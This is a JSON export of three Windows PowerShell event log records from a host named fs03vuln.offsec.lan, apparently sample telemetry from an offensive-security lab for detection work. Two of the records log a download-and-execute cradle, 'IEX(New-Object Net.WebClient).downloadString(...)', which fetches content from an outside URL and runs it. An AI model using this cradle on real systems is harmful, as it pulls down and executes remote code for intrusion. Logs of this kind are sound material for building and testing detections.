[
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Microsoft-Windows-PowerShell",
                    "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
                },
                "EventID": {
                    "@Qualifiers": "",
                    "#text": "4104"
                },
                "Version": "1",
                "Level": "5",
                "Task": "102",
                "Opcode": "15",
                "Keywords": "0x0000000000000000",
                "TimeCreated": {
                    "@SystemTime": "2022-01-24 20:11:11.361954+00:00"
                },
                "EventRecordID": "83421",
                "Correlation": {
                    "@ActivityID": "{3f0c7a49-e4fd-0001-0094-0940fde4d701}",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "5112",
                    "@ThreadID": "4912"
                },
                "Channel": "Microsoft-Windows-PowerShell/Operational",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "MessageNumber",
                        "#text": "1"
                    },
                    {
                        "@Name": "MessageTotal",
                        "#text": "1"
                    },
                    {
                        "@Name": "ScriptBlockText",
                        "#text": "\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\""
                    },
                    {
                        "@Name": "ScriptBlockId",
                        "#text": "965150b4-b107-4cce-9d30-1d3c55a8a085"
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Microsoft-Windows-PowerShell",
                    "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
                },
                "EventID": {
                    "@Qualifiers": "",
                    "#text": "4103"
                },
                "Version": "1",
                "Level": "4",
                "Task": "106",
                "Opcode": "20",
                "Keywords": "0x0000000000000000",
                "TimeCreated": {
                    "@SystemTime": "2022-01-24 20:11:11.361954+00:00"
                },
                "EventRecordID": "83422",
                "Correlation": {
                    "@ActivityID": "{3f0c7a49-e4fd-0000-e3ce-0740fde4d701}",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "5112",
                    "@ThreadID": "4912"
                },
                "Channel": "Microsoft-Windows-PowerShell/Operational",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "ContextInfo",
                        "#text": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 4.0\n        Host ID = 5a3793a4-31d1-4d3d-a8d1-4cd874d06e70\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 4.0\n        Runspace ID = e9d4be2a-52cd-483a-a7d1-e10f67df6e6c\n        Pipeline ID = 13\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 24\n        User = OFFSEC\\admmig\n        Shell ID = Microsoft.PowerShell"
                    },
                    {
                        "@Name": "UserData"
                    },
                    {
                        "@Name": "Payload",
                        "#text": "CommandInvocation(Out-Default): \"Out-Default\"\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"IEX(New-Object Net.WebClient).downloadString('https://miro.medium.com/max/1400/1*FnPDYeZVrGTbuE7Lj7JhgQ.png')\""
                    }
                ]
            }
        }
    },
    {
        "Event": {
            "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
            "System": {
                "Provider": {
                    "@Name": "Microsoft-Windows-PowerShell",
                    "@Guid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}"
                },
                "EventID": {
                    "@Qualifiers": "",
                    "#text": "4104"
                },
                "Version": "1",
                "Level": "5",
                "Task": "102",
                "Opcode": "15",
                "Keywords": "0x0000000000000000",
                "TimeCreated": {
                    "@SystemTime": "2022-01-24 20:11:11.361954+00:00"
                },
                "EventRecordID": "83423",
                "Correlation": {
                    "@ActivityID": "{3f0c7a49-e4fd-0000-e3ce-0740fde4d701}",
                    "@RelatedActivityID": ""
                },
                "Execution": {
                    "@ProcessID": "5112",
                    "@ThreadID": "4912"
                },
                "Channel": "Microsoft-Windows-PowerShell/Operational",
                "Computer": "fs03vuln.offsec.lan",
                "Security": {
                    "@UserID": "S-1-5-21-4230534742-2542757381-3142984815-1111"
                }
            },
            "EventData": {
                "Data": [
                    {
                        "@Name": "MessageNumber",
                        "#text": "1"
                    },
                    {
                        "@Name": "MessageTotal",
                        "#text": "1"
                    },
                    {
                        "@Name": "ScriptBlockText",
                        "#text": "prompt"
                    },
                    {
                        "@Name": "ScriptBlockId",
                        "#text": "63d67bc9-5a54-4394-8b23-363e369f3c91"
                    }
                ]
            }
        }
    }
]